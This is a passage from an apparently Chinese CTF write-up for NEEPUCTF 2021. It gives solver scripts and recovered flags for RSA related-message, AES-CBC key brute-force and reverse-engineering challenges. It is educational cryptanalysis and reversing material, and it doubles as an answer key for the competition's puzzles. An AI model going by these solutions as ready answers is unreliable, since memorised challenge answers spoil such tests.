class="line">flag = <span class="string">b&#x27;Neepu&#123;********************&#125;&#x27;</span></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = nextprime(random.randint(<span class="number">1</span>,<span class="number">1000</span>))</span><br><span class="line">d = gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line">m = encode(p, q, e)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, <span class="number">7</span>, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m+e, <span class="number">7</span>, n)</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671&#x27;</span></span><br><span class="line"><span class="string">&#x27;91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543&#x27;</span></span><br><span class="line"><span class="string">&#x27;10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892&#x27;</span></span><br><span class="line"><span class="string">&#x27;46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>两部分：</p><p>第一部分 $n=pq,c=\text{flag}^e \bmod n$，</p><p>第二部分 $m=\text{enc}(p,q,e),c_1=m^7 \bmod n,c_2=(m+e)^7 \bmod n$。</p><p>先解第二部分，利用Related Message Attack求解 $m$，由于 $e$ 未知且 $e&lt;1010$，爆破 $e$ 求出 $m$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">c1, c2, n, e</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = (x)^<span class="number">7</span> - c1</span><br><span class="line">    g2 = (x+e)^<span class="number">7</span> - c2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line">c1 = <span class="number">10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892</span></span><br><span class="line">c2 = <span class="number">46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119</span></span><br><span class="line">n = <span class="number">91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    m = attack(c1, c2, n, e)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(m,<span class="number">7</span>,n) == c1:</span><br><span class="line">            <span class="built_in">print</span>((e,m))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment">#结果：(71, 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859)</span></span><br><span class="line"><span class="comment">#e = 71</span></span><br><span class="line"><span class="comment">#m = 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859</span></span><br></pre></td></tr></table></figure><p>又 $m=\text{enc}(p,q,e)$，即 $eS=ed \equiv 1 \pmod {(p+1)(q+1)},dp=S \bmod (p+1)=d \bmod (p+1)$，</p><p>由于 $e \cdot dp \equiv e \cdot d \equiv 1 \pmod {(p+1)}$，有 $e \cdot dp-1=k \cdot (p+1)$，</p><p>比较 $e \cdot dp$ 与 $p$ 比特位数相近，故 $k$ 值不大，</p><p>爆破 $k$，当同时满足 $(e \cdot dp-1) \bmod k =0$ 和 $n \bmod \Big(\cfrac{e \cdot dp-1}{k}-1\Big)$ 时，$n$ 成功分解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543</span></span><br><span class="line">dp = <span class="number">129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859</span></span><br><span class="line">e = <span class="number">71</span></span><br><span class="line">c = <span class="number">78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">if</span> (e*dp-<span class="number">1</span>)%k == <span class="number">0</span>:</span><br><span class="line">        p = (e*dp-<span class="number">1</span>)//k-<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n%p == <span class="number">0</span>:</span><br><span class="line">            q = n//p</span><br><span class="line">            <span class="built_in">print</span>((k,p,q))</span><br></pre></td></tr></table></figure><p>最后常规RSA求得flag。</p><p>​</p><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><blockquote><p>简单的AES</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = os.urandom(<span class="number">18</span>)</span><br><span class="line">flag_enc = os.urandom(<span class="number">45</span>)</span><br><span class="line">pad = <span class="string">b&#x27;a&#x27;</span> * <span class="number">12</span> + <span class="string">b&#x27;Neepu&#123;&#x27;</span></span><br><span class="line">flag_enc = pad+flag_enc+<span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">masg1 = flag_enc[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">masg2 = flag_enc[<span class="number">32</span>: ]</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(masg1)^bytes_to_long(masg2)</span><br><span class="line">key = os.urandom(<span class="number">2</span>)*<span class="number">16</span></span><br><span class="line">iv = masg2[<span class="number">16</span>:][:<span class="number">16</span>]</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(key)^bytes_to_long(iv))</span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">enc_flag = aes.encrypt(long_to_bytes(m))</span><br><span class="line"><span class="built_in">print</span>(enc_flag)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">111074535590201916919246051309547040927554959486196038152130336189953949145068</span></span><br><span class="line"><span class="string">b&#x27;\xd8\x83\xfd\x89\xc3+\x11\xb8g\xd2\xf5k\xeeU\x88\xb5\xde\x8bq\x9bC\xab\xe3K2R&lt;\xaa\xbc\x92H\x19&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>先看<code>flag_enc</code>由64字符构成，已知前18字符 <code>aaaaaaaaaaaaNeepu&#123;</code> 和后1字符 <code>&#125;</code> 。</p><p>拆半分别为前32字符 <code>masg1</code> 和后32字符 <code>masg2</code>，异或值 <code>m = masg1^masg2</code>，</p><p>通过AES-CBC加密，key形如 <code>xyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxy</code>，iv为 <code>masg2</code> 后16字符，已知 <code>key^iv</code>。</p><p>从key入手，key只有两位未知，爆破key值，同时得到iv值，利用<strong>iv值16位</strong>和最后1位字符为<code>&#125;</code>，得到key和iv值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tmp=<span class="number">111074535590201916919246051309547040927554959486196038152130336189953949145068</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">		key = <span class="built_in">bytes</span>([i,j])*<span class="number">16</span></span><br><span class="line">		iv = long_to_bytes(tmp^bytes_to_long(key))</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(iv) == <span class="number">16</span> <span class="keyword">and</span> iv[-<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>):</span><br><span class="line">			<span class="built_in">print</span>(iv)</span><br><span class="line">			<span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment">#iv: b&#x27;fefcsukobhmtfhb&#125;&#x27;</span></span><br><span class="line"><span class="comment">#key: b&#x27;\xf5\x91&#x27;*16</span></span><br></pre></td></tr></table></figure><p>由key和iv值+密文 <code>enc</code> 解出 <code>m</code>。</p><p>此时，前32字符 <code>masg1</code> 已知前16字符<code>aaaaaaaaaaaaNeep</code>，后32字符 <code>masg2</code> 已知后16字符 <code>fefcsukobhmtfhb&#125;</code>，根据 <code>m = masg1^masg2</code> 分别异或得到另一半：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">iv = <span class="string">b&#x27;fefcsukobhmtfhb&#125;&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\xf5\x91&#x27;</span>*<span class="number">16</span></span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">m = aes.decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line">masg1 = (<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span> + <span class="string">b&#x27;Neep&#x27;</span>) + long_to_bytes(bytes_to_long(iv)^bytes_to_long(m[<span class="number">16</span>:]))</span><br><span class="line">masg2 = long_to_bytes(bytes_to_long(<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+<span class="string">b&#x27;Neep&#x27;</span>)^bytes_to_long(m[:<span class="number">16</span>])) + iv</span><br><span class="line">flag_enc = masg1 + masg2</span><br><span class="line"></span><br><span class="line"><span class="comment">#aaaaaaaaaaaaNeepu&#123;qszeftwdr-thuilpyji-ijlmukoescfefcsukobhmtfhb&#125;</span></span><br></pre></td></tr></table></figure><p>发现代码里 <code>flag</code> 和 <code>flag_enc</code> 无直接关联，观察 <code>flag_enc</code>为键盘加密，解密得 <code>flag</code>：<code>Neepu&#123;are-you-kidding&#125;</code>。</p><p>​</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="OLLEH"><a href="#OLLEH" class="headerlink" title="OLLEH"></a>OLLEH</h3><blockquote><p>!ni ngis ER laeR</p><p>hint: 师傅们如果做出来了请将flag框架改为Neepu{}，给师傅们带来不便，非常抱歉</p></blockquote><p>IDA，<code>main()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">_main();</span><br><span class="line"><span class="built_in">strcpy</span>((<span class="type">char</span> *)v20, <span class="string">&quot;416:99A:77&quot;</span>);       <span class="comment">//字符串v20 = 416:99A:77</span></span><br><span class="line">v20[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">LOBYTE(v20[<span class="number">7</span>]) = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(v14, <span class="number">0</span>, <span class="keyword">sizeof</span>(v14));</span><br><span class="line">v14[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">v14[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">2</span>; i &lt;= <span class="number">19</span>; ++i )               <span class="comment">//v14 = 长度20的斐波那契数列</span></span><br><span class="line">  v14[i] = v14[i - <span class="number">2</span>] + v14[i - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )                <span class="comment">//v20按 (斐波那契数列值 &amp; 0xF) 移位，存入v4 = 3047414550</span></span><br><span class="line">  *(&amp;v4 + i) = *((<span class="type">char</span> *)v20 + i) - (v14[i] &amp; <span class="number">0xF</span>);</span><br><span class="line">v17[<span class="number">0</span>] = <span class="string">&#x27;OLLEH&#x27;</span>;                         <span class="comment">//v17 = HELLO</span></span><br><span class="line">v17[<span class="number">1</span>] = <span class="number">0</span>i64;</span><br><span class="line">v18 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(v15, <span class="string">&quot;flag&#123;world_Vjea&#125;&quot;</span>);          <span class="comment">//v15 = flag&#123;world_Vjea&#125;</span></span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">4</span>; ++j )</span><br><span class="line">  v16[j] = *((_BYTE *)v17 + j);           <span class="comment">//v16[0:5] = v17[0:5] = HELLO</span></span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">5</span>; j &lt;= <span class="number">9</span>; ++j )</span><br><span class="line">  v16[j] = v15[j];                        <span class="comment">//v16[5:10] = v15[5:10] = world</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Welcome to the 2021 NEEPUCTF&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Now you can enjoy it&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Please input right number:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">v21 = <span class="built_in">strlen</span>(Str);</span><br><span class="line"><span class="keyword">if</span> ( v21 != <span class="number">10</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try again&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v4 == Str[<span class="number">0</span>]</span><br><span class="line">  &amp;&amp; v5 == Str[<span class="number">1</span>]</span><br><span class="line">  &amp;&amp; v6 == Str[<span class="number">2</span>]</span><br><span class="line">  &amp;&amp; v7 == Str[<span class="number">3</span>]</span><br><span class="line">  &amp;&amp; v8 == Str[<span class="number">4</span>]</span><br><span class="line">  &amp;&amp; v9 == Str[<span class="number">5</span>]</span><br><span class="line">  &amp;&amp; v10 == Str[<span class="number">6</span>]</span><br><span class="line">  &amp;&amp; v11 == Str[<span class="number">7</span>]</span><br><span class="line">  &amp;&amp; v12 == Str[<span class="number">8</span>]</span><br><span class="line">  &amp;&amp; v13 == Str[<span class="number">9</span>] )                       <span class="comment">//Str == v4</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;OK,FLAG is  NEEPU&#123;MD5&#123;%s%d%d%d%d%d&#125;&#125;&quot;</span>, v16, v4, v5, v6, v7, v8);</span><br><span class="line">  getchar();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;byebye&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>按代码逻辑，拼接得 <code>v16 = HeLLOworld</code>，<code>v4~v8 = 30474</code>，由于 <code>v4~v8</code> 格式化输出为 <code>%d</code>，转化为对应ASCII值。</p><p>flag得到：<code>Neepu&#123;md5(HeLLOworldworld5148525552)&#125;</code></p><p>​</p><h3 id="ez-re"><a href="#ez-re" class="headerlink" title="ez_re"></a>ez_re</h3><blockquote><p>ezRE, wryyyyy~</p></blockquote><p>两个文件，easyre.dll 和 easyre.exe。</p><p>exeinfope查看easyre.dll，发现是.NET程序，上ILSpy：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// retest.Program</span></span><br><span class="line">internal <span class="keyword">class</span> <span class="title class_">Program</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="type">static</span> <span class="type">void</span> <span class="title">Main</span><span class="params">(string[] args)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		string text = <span class="string">&quot;mT0b&quot;</span>;</span><br><span class="line">		string text2 = <span class="string">&quot;D&#123;0S&quot;</span>;</span><br><span class="line">		string text3 = <span class="string">&quot;Dg9E&quot;</span>;</span><br><span class="line">		string text4 = <span class="string">&quot;OD_&#125;&quot;</span>;</span><br><span class="line">		<span class="type">char</span>[] array = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">4</span>];</span><br><span class="line">		<span class="type">char</span>[] array2 = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">4</span>];</span><br><span class="line">		<span class="type">char</span>[] array3 = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">4</span>];</span><br><span class="line">		<span class="type">char</span>[] array4 = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">4</span>];</span><br><span class="line">		array[<span class="number">0</span>] = text.<span class="built_in">get_Chars</span>(<span class="number">0</span>);</span><br><span class="line">		array[<span class="number">1</span>] = text2.<span class="built_in">get_Chars</span>(<span class="number">0</span>);</span><br><span class="line">		array[<span class="number">2</span>] = text3.<span class="built_in">get_Chars</span>(<span class="number">0</span>);</span><br><span class="line">		array[<span class="number">3</span>] = text4.<span class="built_in">get_Chars</span>(<span class="number">0</span>);</span><br><span class="line">		array2[<span class="number">0</span>] = text.<span class="built_in">get_Chars</span>(<span class="number">1</span>);</span><br><span class="line">		array2[<span class="number">1</span>] = text2.<span class="built_in">get_Chars</span>(<span class="number">1</span>);</span><br><span class="line">		array2[<span class="number">2</span>] = text3.<span class="built_in">get_Chars</span>(<span class="number">1</span>);</span><br><span class="line">		array2[<span class="number">3</span>] = text4.<span class="built_in">get_Chars</span>(<span class="number">1</span>);</span><br><span class="line">		array3[<span class="number">0</span>] = text.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">		array3[<span class="number">1</span>] = text2.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">		array3[<span class="number">2</span>] = text3.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">		array3[<span class="number">3</span>] = text4.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">		array4[<span class="number">0</span>] = text.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">		array4[<span class="number">1</span>] = text2.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">		array4[<span class="number">2</span>] = text3.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">		array4[<span class="number">3</span>] = text4.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">		<span class="built_in">Encrypt1</span>(array);</span><br><span class="line">		<span class="built_in">Encrypt1</span>(array2);</span><br><span class="line">		<span class="built_in">Encrypt1</span>(array3);</span><br><span class="line">		<span class="built_in">Encrypt1</span>(array4);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">Encrypt1</span><span class="params">(<span class="type">char</span>[] string1)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="type">int</span> num = string1.Length;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (string1[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; string1[i] &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (string1[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; string1[i] &lt;= <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					string1[i] = (<span class="type">char</span>)(string1[i] - <span class="number">31</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					string1[i] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (string1[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; string1[i] &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (string1[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; string1[i] &lt;= <span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					string1[i] = (<span class="type">char</span>)(string1[i] + <span class="number">33</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					string1[i] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (string1[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; string1[i] &lt;= <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (string1[i] == <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					string1[i] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					string1[i] = (<span class="type">char</span>)(string1[i] + <span class="number">1</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看Main()，按逻辑得 <code>array1~4</code> 分别为 <code>mDDO,T&#123;gD,009_,bSE&#125;</code>，再看Encrypt1()，<code>a-z</code>移位-31，<code>A-Z</code>移位33，<code>0-9</code> 移位1，操作后得 <code>Neepu&#123;He110_Ctf&#125;</code>。</p><p>​</p><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><blockquote><p>login in please :)</p></blockquote><p>login文件夹里包含usrs_info2.pickle序列化文件，确定是python程序。</p><p>pyinstxtractor解包exe为pyc，再uncompyle6反编译<code>retest2.pyc</code>为python源码，找到flag。</p><p>​</p><h3 id="ppap"><a href="#ppap" class="headerlink" title="ppap"></a>ppap</h3><blockquote><p>最近小猫爱上了闯关</p></blockquote><p>查壳发现upx壳，工具脱壳。</p><p>IDA，<code>main()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 